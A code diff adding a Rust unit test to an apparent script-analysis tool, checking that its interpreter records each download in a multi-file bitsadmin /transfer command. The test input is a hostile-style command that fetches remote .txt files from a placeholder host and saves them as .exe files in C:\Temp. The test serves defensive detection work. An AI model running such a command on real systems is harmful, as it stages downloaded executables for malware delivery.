@@ -7182,6 +7182,33 @@ mod bitsadmin_tests {
     }
 
     #[test]
+    fn bitsadmin_transfer_emits_multiple_download_pairs() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"bitsadmin /transfer myjob /download /priority foreground "https://bits-direct.example/a.txt" "C:\Temp\a.exe" "https://bits-direct.example/b.txt" "C:\Temp\b.exe""#,
+            &mut env,
+        );
+        for (url, dst) in [
+            ("https://bits-direct.example/a.txt", "C:\\Temp\\a.exe"),
+            ("https://bits-direct.example/b.txt", "C:\\Temp\\b.exe"),
+        ] {
+            let has = env.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::BitsadminDownload { url: got_url, dst: got_dst }
+                        if got_url == url && got_dst == dst
+                )
+            });
+            assert!(has, "missing BitsadminDownload for {url}: {:?}", env.traits);
+            assert!(
+                env.modified_filesystem
+                    .contains_key(&dst.to_ascii_lowercase()),
+                "missing filesystem download entry for {dst}: {:?}",
+                env.modified_filesystem
+            );
+        }
+    }
+
+    #[test]
     fn bitsadmin_addfile_emits_download() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
